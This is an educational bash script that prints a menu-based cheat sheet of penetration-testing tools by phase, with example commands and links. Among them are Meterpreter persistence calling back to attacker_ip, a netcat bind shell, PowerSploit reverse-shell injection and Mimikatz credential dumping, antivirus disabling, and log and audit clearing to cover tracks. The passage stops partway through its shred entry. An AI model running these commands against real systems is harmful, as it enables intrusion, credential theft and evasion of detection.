#!/bin/bash


#Define Bolld/Underline

underline='\e[4m'
bold='\e[1m'

# Regular Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
REST='\033[0m' # No Color

# Background Colors
BG_CYAN='\e[46m'



######### Main Menu Function ###########

main_menu () {
while true; do
clear  #to clear the terminal whenever the tool restarted /re-lanuched

 figlet  -f  big  Welcome to EasyTest


echo -e "${GREEN} \n A small wiki that can help begginers & Students to understad Pen Test methodology and which tool they should use in each step with guidance of using it and referances to learn more about it \n ${REST} "

echo -e "${YELLOW} Note:${REST}"
echo "1. there're some powerful tools didn't mentioned here (WireShark,Burpsuite,Aircracker...) we couldn't add them to make the tool much smaller and simpler   "
echo "2. some tools can be used in mulitple steps \n"


   echo "Select a penetration testing step to explore:"
        echo -e "${YELLOW}1. ${REST}Reconnaissance"
        echo -e "${YELLOW}2. ${REST}Scanning"
        echo -e "${YELLOW}3. ${REST}Gaining Access"
        echo -e "${YELLOW}4. ${REST}Maintaining Access"
        echo -e "${YELLOW}5. ${REST}Covering Tracks"
        echo -e "${YELLOW}6. ${REST} More References & Useful Links "
        echo -e "${YELLOW}7. ${REST} Exit "

 read -p  "Enter your choice [1-6]:" choice 

echo ""

    case $choice in
        1)
            reconnaissance ;;
        2)
            scanning ;;
        3)
            gaining_access ;;
        4)
            maintaining_access ;;
        5)
            covering_tracks  ;;

        6)
           More_References  ;;

        7)
            echo "Exiting..."
            break
            ;;
        *)
            echo "Invalid choice, please select a number between 1 and 6."
            ;;
    esac
done


}


##############1.Phase##########

# Function to display Reconnaissance tools and usage
reconnaissance() {
while true; do
    clear  # Clear the terminal screen for better readability
    echo -e "${BG_CYAN}${bold}Reconnaissance Tools and Usage:${REST}"
        echo "1. NMAP"
        echo "2. Whois"
        echo "3. NSlookup"
        echo "4. TheHarvester"
        echo "5. Maltego"
        echo "6. Go back to the main menu"
        read -p "Choose a tool [1-6]: " tool_choice

        case $tool_choice in



1)
clear
    echo -e "\n${YELLOW}• 1.Nmap${REST}"
    echo -e "${bold}Nmap is a network scanning tool used to discover hosts and services on a computer network.${REST}\n"
    echo -e "${YELLOW}${bold}• Commands:${REST}"
    echo -e "${YELLOW}===================================================================${REST}\n"
    echo -e " - nmap -sP target_ip_range ${GREEN}# Ping scan to discover live hosts. (e.g., nmap -sP 192.168.1.0/24)${REST}"
    echo -e " - nmap -sV target_ip ${GREEN}# Version detection scan to identify services and their versions. (e.g., nmap -sV 192.168.1.1)${REST}"
    echo -e " - nmap -O target_ip ${GREEN}# OS detection scan to determine the operating system of the target. (e.g., nmap -O 192.168.1.1)${REST}"
    echo -e " - nmap -A target_ip ${GREEN}# Comprehensive scan that includes OS detection,version detection, script scanning,and traceroute. (e.g., nmap -A 192.168.1.1)${REST}"
    echo -e " - nmap --script vuln target_ip ${GREEN}# Scan for vulnerabilities using NSE scripts. (e.g., nmap --script vuln 192.168.1.1)${REST}"

    echo -e "${bold} ${YELLOW}• Referance:${REST}"

    echo -e  "- ${GREEN} https://nmap.org/${REST}"
    echo -e  "- ${GREEN} https://www.youtube.com/watch?v=5MTZdN9TEO4&list=PLBf0hzazHTGM8V_3OEKhvCM9Xah3qDdIx ${REST}"

    echo -e "${YELLOW}===================================================================${REST}\n"
;;


2)
clear

echo -e "${YELLOW}• 2.Whois${REST}"
    echo -e "${bold}Whois is a query and response protocol used for querying databases to determine the registrant or assignee of a domain name or IP address.${REST}"
    echo -e "${YELLOW}${bold}•Commands:${REST}"
    echo -e " - whois example.com ${GREEN}# Basic WHOIS lookup for domain information. (e.g., whois example.com)${REST}"
    echo -e " - whois -h whois.nic.net IP_address ${GREEN}# WHOIS lookup for an IP address. (e.g., whois -h whois.nic.net 8.8.8.8)${REST}"
    echo -e " - whois -H example.com ${GREEN}# Hide legal disclaimers in the output. (e.g., whois -H example.com)${REST}"
    echo -e " - whois --verbose example.com ${GREEN}# Verbose output with detailed information. (e.g., whois --verbose example.com)${REST}"
    echo -e " - whois --help ${GREEN}# Display help for WHOIS commands.${REST}"

    echo -e "- ${bold} ${YELLOW}• Referance:${REST}"
    echo -e "- ${GREEN}https://www.whois.com/whois/${REST}"
    echo -e "- ${GREEN}https://domaintools.com/wp-content/uploads/Whois-User-Guide.pdf${REST}"
    echo -e "- ${GREEN}https://lookup.icann.org/en/lookup${REST}"
    echo -e "- ${GREEN}https://www.youtube.com/watch?v=12MITs5KK40&ab_channel=HackerSploit${REST}" 

echo -e "${YELLOW}===================================================================${REST}\n"
;;


3)
clear

echo -e "${YELLOW}• 3 Nslookup${REST}"
    echo -e "${bold}Nslookup is a network administration command-line tool used for querying the Domain Name System (DNS) to obtain domain name or IP address mapping or other DNS records.${REST}"
    echo -e "${YELLOW}${bold}•Commands:${REST}"
    echo -e " - nslookup example.com ${GREEN}# Basic DNS query to find IP address of the domain. (e.g., nslookup example.com)${REST}"
    echo -e " - nslookup -type=mx example.com ${GREEN}# Query for mail exchange records. (e.g., nslookup -type=mx example.com)${REST}"
    echo -e " - nslookup -type=ns example.com ${GREEN}# Query for name server records. (e.g., nslookup -type=ns example.com)${REST}"
    echo -e " - nslookup -type=soa example.com ${GREEN}# Query for start of authority records. (e.g., nslookup -type=soa example.com)${REST}"
    echo -e " - nslookup -type=txt example.com ${GREEN}# Query for text records. (e.g., nslookup -type=txt example.com)${REST}"

echo -e "${bold} ${YELLOW}• Referance:${REST}"
    echo -e "- ${GREEN}https://www.linode.com/docs/guides/how-to-use-nslookup-command/${REST}"
    echo -e "- ${GREEN}https://www.youtube.com/watch?v=rQ-dc5kwRtU&ab_channel=HackerSploit${REST}"
    echo -e "- ${GREEN}https://www.cloudns.net/blog/10-most-used-nslookup-commands/${REST}"

echo -e "${YELLOW}===================================================================${REST}\n"
;;


4)
clear

echo -e "${YELLOW}•4 TheHarvester${REST}"
    echo -e "${bold}TheHarvester is a comprehensive open-source tool designed for the passive gathering of information related to a specific domain, facilitating the process of reconnaissance in cybersecurity assessments.${REST}"
    echo -e "${YELLOW}Commands:${REST}"
    echo -e " - theharvester -d example.com -l 500 -b google ${GREEN}# Search for information using Google. (e.g., theharvester -d example.com -l 500 -b google)${REST}"
    echo -e " - theharvester -d example.com -b bing ${GREEN}# Search for information using Bing. (e.g., theharvester -d example.com -b bing)${REST}"
    echo -e " - theharvester -d example.com -b linkedin ${GREEN}# Search for information using LinkedIn. (e.g., theharvester -d example.com -b linkedin)${REST}"
    echo -e " - theharvester -d example.com -b twitter ${GREEN}# Search for information using Twitter. (e.g., theharvester -d example.com -b twitter)${REST}"
    echo -e " - theharvester -d example.com -b all ${GREEN}# Search for information using all available sources. (e.g., theharvester -d example.com -b all)${REST}"


echo -e "${bold} ${YELLOW}• Referance:${REST}"
    echo -e "- ${GREEN}https://www.kali.org/tools/theharvester/${REST}"
    echo -e "- ${GREEN}https://carlosrecruits.com/guides/theharvester/${REST}"
    echo -e "- ${GREEN}https://forrestcli.com/tools/theHarvester${REST}"
    echo -e "- ${GREEN}https://youtu.be/VytCL2ujjcA?si=Ts99hR3-LHFRjSjW${REST}"
echo -e "${YELLOW}===================================================================${REST}\n"
;;


5)
clear

    echo -e "${YELLOW}•5 Maltego${REST}"
    echo -e "${bold}Maltego is a powerful open-source intelligence (OSINT) tool used for information gathering and link analysis. It allows you to visualize and explore relationships between various entities such as domains, IP addresses, people, and organizations.${REST}"

echo -e "${bold} ${YELLOW}• Referance:${REST}"
    echo -e "- ${GREEN}https://www.stationx.net/how-to-use-maltego/${REST}"
    echo -e "- ${GREEN}https://youtu.be/kmOIhvsklv8?si=5I5fg2dCgZy87nl8${REST}"
echo -e "${YELLOW}===================================================================${REST}\n"

;;
  6) break;;
            *) echo "Invalid choice, please select a number between 1 and 6.";;
        esac
        echo -e "\nPress Enter to continue..."
        read # to read user input while in the loop 
    done



}

################## 2th Phase  ####################


# Function to display Scanning tools and usage
scanning() {
    while true; do
clear  # Clear the terminal screen for better readability

    echo -e "${BG_CYAN}${bold}Scanning Tools and Usage:${REST}"
        echo "1. NMAP"
        echo "2. Nikto"
        echo "3. OpenVas"
        echo "4. Nessus"
        echo "5. AMAP"
        echo "6. Go back to the main menu"
        read -p "Choose a tool [1-6]: " tool_choice

        case $tool_choice in
1)
clear
    echo -e "${YELLOW}• 1. Nmap ${REST}"
    echo " as mentioned in privous Step for reference & usage"
echo -e "${YELLOW}===================================================================${REST}\n"
;;


2)
clear

    echo -e "${YELLOW}•2 Nikto ${REST}"
    echo -e "${bold}Nikto is an open-source web server scanner designed to identify potential security vulnerabilities in web servers and applications${REST} "
echo -e "${YELLOW}\nCommands:${REST}"
                echo -e "1. nikto -h target_ip ${GREEN} # Basic scan of the target web server ${REST}"
                echo -e "2. nikto -h target_ip -ssl ${GREEN} # Scan an HTTPS server ${REST}"
                echo -e "3. nikto -h target_ip -port 8080  ${GREEN}# Scan a web server on a non-standard port ${REST}"
                echo -e "4. nikto -h target_ip -output result.html ${GREEN} # Save scan results to an HTML file ${REST}"
                echo -e "5. nikto -h target_ip -Tuning 9 ${GREEN} # Perform an aggressive scan ${REST}"

echo -e "${bold} ${YELLOW}• Referance:${REST}"

    echo -e "- ${GREEN}https://www.kali.org/tools/nikto/${REST}"
    echo -e "- ${GREEN}https://cdn.comparitech.com/wp-content/uploads/2019/07/NIkto-Cheat-Sheet.pdf${REST}"
    echo -e "- ${GREEN}https://youtu.be/K78YOmbuT48?si=_LEHeFLqzng6oAop ${REST}"

echo -e "${YELLOW}===================================================================${REST}\n"
;;


3)
clear

              echo -e " ${YELLOW}•3 OpenVAS  ${REST}"
              echo -e "${bold}OpenVAS is an open-source vulnerability scanning and management tool designed to detect and assess security vulnerabilities in computer systems, networks, and applications${REST}"
echo -e "\n${YELLOW}Commands:${REST}"
                echo -e "1. openvas-start ${GREEN} # Start the OpenVAS service ${REST}"
                echo -e "2. openvas-stop  ${GREEN}  # Stop the OpenVAS service ${REST}"
                echo -e "3.openvasmd --rebuild --progress  ${GREEN}# Rebuild the OpenVAS database ${REST}"
                echo -e "4. omp --username=admin --password=admin --xml='<get_tasks/>' ${GREEN} # List all scan tasks ${REST}"

               echo -e "${bold} ${YELLOW}• Referance:${REST}"

    echo -e "- ${GREEN}https://hackertarget.com/openvas-tutorial-tips/${REST}"
    echo -e "- ${GREEN}https://youtu.be/LGh2SetiKaY?si=IiyMCLwwOosKf0Kb${REST}"

echo -e "${YELLOW}===================================================================${REST}\n"

;;


4)
clear
             echo -e "${YELLOW}•4 Nessus ${REST}"
             echo -e "${bold}Nessus is a widely used vulnerability scanner that helps identify security weaknesses in computer systems, networks, and applications. It scans for vulnerabilities, misconfigurations, and potential threats, allowing organizations to proactively address security issues${REST}"
echo -e "\n${YELLOW}Commands:${REST}"
                echo -e "1. /opt/nessus/sbin/nessuscli agent link --key=agent_key --groups=group_name --host=hostname --port=port ${GREEN}#Link a Nessus agent ${REST}"
                echo -e "2. /opt/nessus/sbin/nessuscli update all  ${GREEN}  #Update plugins and components ${REST}"
                echo -e "3. /opt/nessus/sbin/nessuscli agent unlink ${GREEN}#Unlink the agent from the server ${REST}"
                echo -e "4. /opt/nessus/sbin/nessuscli agent status ${GREEN} #Check the status of the agent ${REST}"

               echo -e "${bold} ${YELLOW}• Referance:${REST}"

    echo -e "- ${GREEN}https://docs.tenable.com/nessus/Content/CommandLineOperations.htm${REST}"
    echo -e "- ${GREEN}https://www.dropbox.com/scl/fi/1juwf4rh7hjcmofjmc31s/New-way-to-install-Nessus-on-Kali.pdf?rlkey=nk409qq19sk22vhy71gj5814o&e=1&st=2nb2rzvg&dl=0${REST}"
    echo -e "- ${GREEN}https://www.youtube.com/watch?v=Gy-aPBb0djk&ab_channel=DavidBombal${REST}"
echo -e "${YELLOW}===================================================================${REST}\n"

;;


5)
clear

  echo -e "${YELLOW}•5 AMAP(Application MAPper) ${REST}"
             echo -e "${bold}It is a next-generation scanning tool for pentesters. It attempts to identify applications even if they are running on a different port than normal. It also identifies non-ascii based applications.${REST}"

echo -e "\n${YELLOW}Commands:${REST}"

                echo -e "1. amap -i hosts.txt ${GREEN}#Scan multiple hosts listed in a file${REST}"
                echo -e "2. amap -d target_ip  ${GREEN}#Perform a scan with debug output ${REST}"
                echo -e "3.  amap -bq target_ip ${GREEN}# Perform a stealth scan${REST}"
                echo -e "4.  amap -A target_ip ${GREEN} # Perform a comprehensive application scan${REST}"

               echo -e "${bold} ${YELLOW}• Referance:${REST}"

    echo -e "- ${GREEN}https://www.kali.org/tools/amap/${REST}"
    echo -e "- ${GREEN}https://youtu.be/68sOsdAk1Ew?si=dGj7uf9Qxdu4vdLA${REST}"
echo -e "${YELLOW}===================================================================${REST}\n"
;;

    6) break;;
            *) echo "Invalid choice, please select a number between 1 and 6.";;
        esac
        echo -e "\nPress Enter to continue..."
        read
    done


}

##############3th Phase.################


# Function to display Gaining Access tools and usage
gaining_access() {
   while true; do
    clear  # Clear the terminal screen for better readability
    echo -e "${BG_CYAN}${bold}gaining access Tools and Usage:${REST}\n"
        echo "1. Metasploit"
        echo "2. Hydra"
        echo "3. SQLMap"
        echo "4. John the Ripper"
        echo "5. Medusa"
        echo "6. Go back to the main menu"
        read -p "Choose a tool [1-6]: " tool_choice



case $tool_choice in
        1)
            clear
             echo -e "${YELLOW}•1 Metasploit  ${REST}"
             echo -e "${bold}Metasploit is a powerful penetration testing framework that helps security professionals identify and exploit vulnerabilities in computer systems, networks, and applications. It provides a wide range of tools for testing and assessing security, including exploits, payloads, and post-exploitation modules. widely used for ethical hacking, red teaming, and security assessments ${REST}"
             echo -e "\n${YELLOW}Commands:${REST}"

                echo -e "1. msfconsole ${GREEN}#Start the Metasploit console${REST}"
                echo -e "2. search exploit_name  ${GREEN}#Search for a specific exploit ${REST}"
                echo -e "3.  use exploit_path ${GREEN}# Use a specific exploit module${REST}"
                echo -e "4. set RHOST target_ip ${GREEN} # Set the remote host IP address${REST}"
                echo -e "4. exploit ${GREEN} # Run the exploit${REST}"
            echo -e "${bold} ${YELLOW}• Referance:${REST}"

            echo -e "- ${GREEN}https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html${REST}"
            echo -e "- ${GREEN}https://www.youtube.com/watch?v=8lR27r8Y_ik&list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm${REST}"
            echo -e "${YELLOW}===================================================================${REST}\n"
;;



2)
clear
echo -e "${YELLOW}•1 Hydra ${REST}"
             echo -e "${bold}Hydra is a command-line tool used for brute-force attacks to guess valid pairs of usernames and passwords. It’s commonly used to test the security of online applications by attempting various login combinations. Unlike offline password crackers, Hydra focuses on online services and protocols, making it suitable for web-based penetration testing${REST}"
echo -e "\n${YELLOW}Commands:${REST}"

                echo -e "1. hydra -l username -p password target_ip service ${GREEN}#Basic brute-force attack on a service${REST}"
                echo -e "2. hydra -L userlist.txt -P passlist.txt target_ip service  ${GREEN}#Brute-force attack using lists of usernames and passwords ${REST}"
                echo -e "3.  hydra -t 4 -l username -P passlist.txt target_ip service ${GREEN}# Set the number of parallel connections (4 in this case)${REST}"
                echo -e "4. hydra -o output.txt -L userlist.txt -P passlist.txt target_ip service ${GREEN} # Save the results to a file${REST}"

echo -e "${bold} ${YELLOW}• Referance:${REST}"

       echo -e "- ${GREEN}https://www.kali.org/tools/hydra/${REST}"
       echo -e "- ${GREEN}https://www.stationx.net/how-to-use-hydra/${REST}"
       echo -e "- ${GREEN}https://www.youtube.com/watch?v=kadJLB2rYWo&ab_channel=InfoSecPat${REST}"
echo -e "${YELLOW}===================================================================${REST}\n"

;;

            3)
                clear
                echo -e "${YELLOW} •3 SQLMap ${REST}"
                echo -e "${bold}is a powerful tool used for detecting and exploiting SQL injection vulnerabilities in web applications ${REST}"
                echo -e "\n${YELLOW}${bold}• Commands:${REST}"
                echo -e "1. sqlmap -u 'http://target.com/vulnerable_page.php?id=1'  ${GREEN}# Basic SQL injection test ${REST}"
                echo -e "2. sqlmap -u 'http://target.com/vulnerable_page.php?id=1' --dbs  ${GREEN}# List the available databases ${REST}"
                echo -e "3. sqlmap -u 'http://target.com/vulnerable_page.php?id=1' -D database_name --tables  ${GREEN}# List tables in a specific database ${REST}"
                echo -e "4. sqlmap -u 'http://target.com/vulnerable_page.php?id=1' -D database_name -T table_name --columns ${GREEN} # List columns in a specific table ${REST}"
                echo -e "5. sqlmap -u 'http://target.com/vulnerable_page.php?id=1' -D database_name -T table_name -C column_name --dump  ${GREEN}# Dump the data from a specific column ${REST}"

                 echo -e "${bold} ${YELLOW}• Referance:${REST}"

                 echo -e "- ${GREEN}https://www.stationx.net/sqlmap-tutorial/ ${REST}"
                 echo -e "- ${GREEN}https://highon.coffee/blog/sqlmap-cheat-sheet/${REST}"
                 echo -e "- ${GREEN}https://youtu.be/nVj8MUKkzQk?si=0kHJRlqBbqZin6Mb${REST}"
                 echo -e "${YELLOW}===================================================================${REST}\n"
                   ;;
            4)
                clear
                echo -e "${YELLOW} •4 John the Ripper (Password cracker):"
                echo -e "\n${YELLOW}${bold}• Commands:${REST}"
                echo -e "1. john --wordlist=password.lst hashfile  ${GREEN}# Crack passwords using a wordlist ${REST}"
                echo -e "2. john --show hashfile  ${GREEN}# # Show cracked passwords ${REST}"
                echo -e "3. john --incremental hashfile  ${GREEN}# # Perform an incremental brute-force attack${REST}"
                echo -e "4. john --rules --wordlist=password.lst hashfile ${GREEN} # Use wordlist with rules to modify words ${REST}"
                echo -e "5. john --format=raw-md5 hashfile ${GREEN}# Specify hash format (e.g., raw MD5) ${REST}"

                 echo -e "${bold} ${YELLOW}• Referance:${REST}"

                 echo -e "- ${GREEN}https://youtu.be/XjVYl1Ts6XI?si=e591eO_WMG8xaJO- ${REST}"
                 echo -e "- ${GREEN}https://youtu.be/C9wP49Z2JBQ?si=6OJQhlYBRevuGZfe${REST}"
                 echo -e "- ${GREEN}https://tinyurl.com/d3bkecrz${REST}"
                 echo -e "${YELLOW}===================================================================${REST}\n"
                 ;;
            5)
                clear
                echo -e "${YELLOW}•4 Medusa${REST}"
                echo -e "${bold}Medusa is a powerful and lightweight tool designed for brute-forcing login credentials ${REST}"
                echo -e "1. medusa -h target_ip -u username -p password -M service  ${GREEN}#Basic brute-force attack on a service ${REST}"
                echo -e "2. medusa -h target_ip -U userlist.txt -P passlist.txt -M service  ${GREEN}# # Brute-force attack using lists of usernames and passwords ${REST}"
                echo -e "3. medusa -h target_ip -u username -P passlist.txt -M service -t 4 ${GREEN}# Set the number of parallel connections (4 in this case)${REST}" 
                echo -e "4. 4. medusa -h target_ip -u username -p password -M service -O output.txt ${GREEN} #Save the results to a file ${REST}"
                echo -e "5. medusa -h target_ip -u username -p password -M service -n port ${GREEN}#Specify the port for the service${REST} "

                 echo -e "${bold} ${YELLOW}• Referance:${REST}"

                 echo -e "- ${GREEN}https://www.kali.org/tools/medusa/ ${REST}"
                 echo -e "- ${GREEN}https://youtu.be/ANE5qhZsm7U?si=OkTiEUd-cTz-J2Qk${REST}"
                 echo -e "${YELLOW}===================================================================${REST}\n"

                   ;;


            6) break;;
            *) echo "Invalid choice, please select a number between 1 and 6.";;
        esac
        echo -e "\nPress Enter to continue..."
        read
    done

}

#################4th Phase.#####################


# Function to display Maintaining Access tools and usage
maintaining_access() {


   while true; do
        clear  # Clear the terminal screen for better readability
        echo -e "${BG_CYAN}${bold}Maintaining Access Tools and Usage:${REST}"
        echo "1. Metasploit (Meterpreter)"
        echo "2. pwnat"
        echo "3. weevely"
        echo "4. Netcat"
        echo "5. Powersploit "
        echo "6. Go back to the main menu"
        read -p "Choose a tool [1-6]: " tool_choice

        case $tool_choice in
            1)
                clear
                echo -e "${YELLOW}•1 Metasploit (Meterpreter)${REST}"
                echo -e "${bold}Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is used by Metasploit to maintain access and control over a victim machine.${REST}"
                echo -e "\n${YELLOW}Commands:${REST}"
                echo -e "1. sessions -l ${GREEN}# List all active Meterpreter sessions${REST}"
                echo -e "2. sessions -i session_id ${GREEN}# Interact with a specific session${REST}"
                echo -e "3. run persistence -U -i 5 -p 4444 -r attacker_ip ${GREEN}# Setup persistence to run on user login with a 5-second interval, connecting back to attacker_ip on port 4444${REST}"
                echo -e "4. upload local_file remote_path ${GREEN}# Upload a file from the local machine to the remote target${REST}"
                echo -e "5. download remote_file local_path ${GREEN}# Download a file from the remote target to the local machine${REST}"
                echo -e "${bold}${YELLOW}• Reference:${REST}"
                echo -e "- ${GREEN}https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/ ${REST}"
                echo -e "- ${GREEN}https://youtu.be/xsyeL6xWWy4?si=mR2e89gt0Tuc_SWX ${REST}"
                echo -e "${YELLOW}===================================================================${REST}\n"
                ;;
            2)
                clear
                echo -e "${YELLOW}•2 pwnat${REST}"
                echo -e "${bold}pwnat is a tool that allows any number of clients behind NAT gateways to communicate with a server behind a different NAT gateway with no port forwarding, DMZ setup, or DNS tricks.${REST}"
                echo -e "\n${YELLOW}Commands:${REST}"
                echo -e "1. pwnat --server --port 12345 ${GREEN}# Start pwnat server on port 12345${REST}"
                echo -e "2. pwnat --client server_ip --port 12345 ${GREEN}# Connect to the pwnat server running at server_ip on port 12345${REST}"
                echo -e "3. pwnat --server --udp --port 12345 ${GREEN}# Start pwnat server using UDP on port 12345${REST}"
                echo -e "4. pwnat --client server_ip --udp --port 12345 ${GREEN}# Connect to the pwnat server using UDP at server_ip on port 12345${REST}"
                echo -e "5. pwnat --help ${GREEN}# Display help information${REST}"
                echo -e "${bold}${YELLOW}• Reference:${REST}"
                echo -e "- ${GREEN}http://samy.pl/pwnat/ ${REST}OPEN this in Virtual as it doesn't support HTTPS"
                echo -e "- ${GREEN}https://www.kali.org/tools/pwnat/${REST}"
                echo -e "- ${GREEN}https://github.com/samyk/pwnat ${REST}"
                echo -e "${YELLOW}===================================================================${REST}\n"
                ;;
            3)
                clear
                echo -e "${YELLOW}•3 weevely${REST}"
                echo -e "${bold}Weevely is a stealth PHP web shell that simulates a telnet-like connection, making it a useful post-exploitation tool for web servers.${REST}"
                echo -e "\n${YELLOW}Commands:${REST}"
                echo -e "1. weevely generate password /path/to/webshell.php ${GREEN}# Generate a new web shell with the specified password${REST}"
                echo -e "2. weevely http://target.com/webshell.php password ${GREEN}# Connect to the web shell at the target URL using the password${REST}"
                echo -e "3. :upload local_file remote_path ${GREEN}# Upload a file to the remote server${REST}"
                echo -e "4. :download remote_file local_path ${GREEN}# Download a file from the remote server${REST}"
                echo -e "5. :spawn /bin/bash ${GREEN}# Spawn a bash shell on the remote server${REST}"
                echo -e "${bold}${YELLOW}• Reference:${REST}"
                echo -e "- ${GREEN}https://github.com/epinna/weevely3 ${REST}"
                echo -e "- ${GREEN}https://securityonline.info/weevely-tutorial-php-webshell/ ${REST}"
                echo -e "- ${GREEN}https://www.hackercoolmagazine.com/weevely-web-shell-complete-guide/ ${REST}"
                echo -e "${YELLOW}===================================================================${REST}\n"
                ;;
            4)
                clear
                echo -e "${YELLOW}•1 Netcat${REST}"
                echo -e "${bold}Netcat, also known as nc is a versatile networking utility tool that operates as both a network listener and a client. Netcat can be used for tasks such as port scanning, file transfers, remote access (reverse shell), and network debugging.${REST}"
                echo -e "\n${YELLOW}Commands:${REST}"
                echo -e "1. nc -l -p 4444 ${GREEN}# Listen on port 4444 for incoming connections${REST}"
                echo -e "2. nc target_ip 4444 ${GREEN}# Connect to target_ip on port 4444${REST}"
                echo -e "3. nc -l -p 4444 -e /bin/bash ${GREEN}# Bind a shell to port 4444${REST}"
                echo -e "4. nc -zv target_ip 1-1000 ${GREEN}# Scan open ports from 1 to 1000${REST}"
                echo -e "5. nc -w 3 target_ip 4444 ${GREEN}# Set a timeout of 3 seconds for the connection${REST}"
                echo -e "${bold}${YELLOW}• Reference:${REST}"
                echo -e "- ${GREEN}https://nmap.org/ncat/guide/index.html ${REST}"
                echo -e "- ${GREEN}https://youtu.be/1kHXf51Sqpk?si=6YJBWWXC-CAcrSvS ${REST}"
                echo -e "- ${GREEN}https://youtu.be/VF4In6rIPGc?si=6aUT-0skLhiz3Fe_ ${REST}"
                echo -e "${YELLOW}===================================================================${REST}\n"
                ;;
            5)
                clear
                echo -e "${YELLOW}•5 PowerSploit${REST}"
                echo -e "${bold}PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment.${REST}"
                echo -e "\n${YELLOW}Commands:${REST}"
                echo -e "1. Import-Module PowerSploit.psm1 ${GREEN}# Import the PowerSploit module${REST}"
                echo -e "2. Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost attacker_ip -Lport 4444 ${GREEN}# Inject shellcode into the remote process${REST}"
                echo -e "3. Invoke-Mimikatz -DumpCreds ${GREEN}# Run Mimikatz to dump credentials${REST}"
                echo -e "4. Invoke-ReflectivePEInjection -PEPath <path_to_pe> -ProcId <process_id> ${GREEN}# Reflectively load a PE into the specified process${REST}"
                echo -e "5. Invoke-TokenManipulation -CreateElevatedProcess 'cmd.exe' ${GREEN}# Create an elevated command prompt using token manipulation${REST}"
                echo -e "${bold}${YELLOW}• Reference:${REST}"
                echo -e "- ${GREEN}https://powersploit.readthedocs.io/en/latest/#usage ${REST}"
                echo -e "- ${GREEN}https://www.stationx.net/how-to-use-powersploit/ ${REST}"
                echo -e "- ${GREEN}https://youtu.be/52xkWbDMUUM?si=o9ulTii37GwiO_Jd ${REST}"
                echo -e "${YELLOW}===================================================================${REST}\n"
                ;;
            6)
                break
                ;;
            *)
                echo "Invalid choice, please select a number between 1 and 6."
                ;;
        esac
        echo -e "\nPress Enter to continue..."
        read
    done
}
##################5th Phase.#####################


# Function to display Covering Tracks tools and usage
covering_tracks() {
while true;do
    clear  # Clear the terminal screen for better readability
echo -e "\n${YELLOW} Once intruders have successfully gained administrator access on a system, they will try to cover the tracks to avoid their detection.Attacker uses following techniques to cover tracks on the target system:\n${REST}"
    echo "• Disable auditing"
    echo "• Clearing logs"
    echo -e "• Manipulating logs\n"

    echo -e "${BG_CYAN}${bold}Covering Tracks Tools and Usage:${REST}"
    echo "1. Metasploit (Clearev Module)"
    echo "2. Manage/Disable auditing"
    echo "3. Shred"
    echo "4. Go back to the main menu"
    read -p "Choose a tool [1-4]: " tool_choice


    case $tool_choice in
            1)
                clear
                echo -e "\n${bold}Attacker uses clearlogs.exe utility to clear the security, system, and application logs. If the system is exploited with Metasploit, attacker uses meterpreter shell to wipe out all the logs from a Windows system.${REST}"
                echo -e "\n${YELLOW}•1 Metasploit (Meterpreter)${REST}"
                echo -e "${bold}Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is used by Metasploit to maintain access and control over a victim machine.${REST}"
                echo -e "\n${YELLOW}Commands:${REST}"
                echo -e "${bold} use the following cmds once you get inside Victim Machine ((Meterpreter cmd Line)) ${REST}"
                echo -e "1. clearev ${GREEN}# Clear event logs on the target machine${REST}"
                echo -e "2. timestomp -m <date> <file> ${GREEN}# Modify the MACE timestamps on a file${REST}"
                echo -e "3. hashdump ${GREEN}# Dump the SAM database hashes${REST}"
                echo -e "4. migrate <PID> ${GREEN}# Migrate the Meterpreter session to another process${REST}"
                echo -e "5. run post/windows/manage/killav ${GREEN}# Disable antivirus on the target machine${REST}"
                echo -e "${bold} ${YELLOW}• Reference:${REST}"
                echo -e "${GREEN}https://privacy.sexy/ ${REST}${bold}Very Useful website ${REST}"
echo -e "${YELLOW}===================================================================${REST}\n"

echo -e "${YELLOW}•Manually Clearing Event Logs:${REST}\n"
echo -e "${bold}Windows:${REST}"
echo -e " Navigate to Start > Control Panel > System and Security > Administrative Tools > double click ${bold}Event Viewer${REST}. Delete the all the log entries logged while compromising of the system."
echo -e "\n${bold}•Linux:${REST}"
echo -e "Navigates to /var/log directory on the Linux system "
echo -e "Open plain text file containing log messages with text editor /var/log/messages"
echo -e "Delete the all the log entries logged while compromising of the system"

 ;;
            2)
                clear
                 echo -e "\n${YELLOW}2. AuditPol${REST}"
                 echo -e "${bold}Auditpol.exe is a command-line utility in Windows OS that can be used to configure and manage audit policy settings from an elevated command prompt. It allows you to manage and audit policy sub-category settings in a more precise way.${REST}"
                 echo -e "\n${YELLOW}If you wish to enable this AuditPol option:${REST}"
                 echo  "- Open Local Security Policy > Local Policies > Security Options"
                 echo  "- Now in the right panel, double-click on Audit: Force audit policy subcategory settings (Windows Vista or later) to override audit policy category settings"
                 echo  "- Select Enabled > Apply/OK."
                 echo -e "\n${YELLOW}Commands:${REST}"
                 echo -e "1. auditpol /clear /y ${GREEN}# Clear all audit policies${REST}"
                 echo -e "2. auditpol /get /category:* ${GREEN}# Display current audit policies${REST}"
                 echo -e "3. auditpol /set /subcategory:'Logon' /success:disable /failure:disable ${GREEN}# Disable logon auditing${REST}"
                 echo -e "4. auditpol /backup /file:<path> ${GREEN}# Backup current audit policies${REST}"
                 echo -e "5. auditpol /restore /file:<path> ${GREEN}# Restore audit policies from a backup file${REST}"
                 echo -e "${bold}${YELLOW}• Reference:${REST}"
                 echo -e "${GREEN}https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol ${REST}"
                 echo -e "${GREEN}https://www.thewindowsclub.com/what-is-auditpol-in-windows-7-and-how-to-enable-it ${REST}"
                 echo -e "${GREEN}https://youtu.be/znKL1mTTvFU?si=_4b4Ed0p6ycu6zjs ${REST}"
                 echo -e "${YELLOW}===================================================================${REST}\n"
                ;;



            3)
             clear
             echo -e "\n${YELLOW}3. Shred${REST}"
             echo -e "${bold}Shred overwrites the specified files repeatedly, in order to make it harder for even very expensive hardware probing to recover the data.${REST}"
             echo -e "\n${YELLOW}Commands:${REST}"
             echo -e "1. shred -u file.txt ${GREEN}# Overwrite and delete file.txt${REST}"
